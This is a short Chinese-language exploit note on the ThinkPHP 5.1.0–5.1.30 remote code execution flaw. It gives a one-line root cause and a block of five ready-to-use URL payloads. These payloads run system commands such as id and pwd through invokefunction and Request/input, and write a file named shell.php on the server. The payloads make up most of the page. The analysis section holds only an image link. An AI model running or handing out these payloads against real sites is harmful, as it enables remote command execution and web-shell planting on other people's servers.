# thinkphp 5.1.x RCE

# 参考文章

[https://xz.aliyun.com/t/9369](https://xz.aliyun.com/t/9369)

# RCE1

## 根本原因

thinkphp没有对用户传入的操作器名称进行过滤,导致可以调用顶部类中的方法,造成一系列的危害

## 影响版本

TP5.1.0-5.1.30

## payload

 ```PHP
 ?s=index/\think\Request/input&filter[]=system&data=pwd
 ?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>#注意由于windows不区分大小写的原因所以这个payload在windows下无法使用
 ?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
 ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ```


## 分析

![](image/analysize.png)


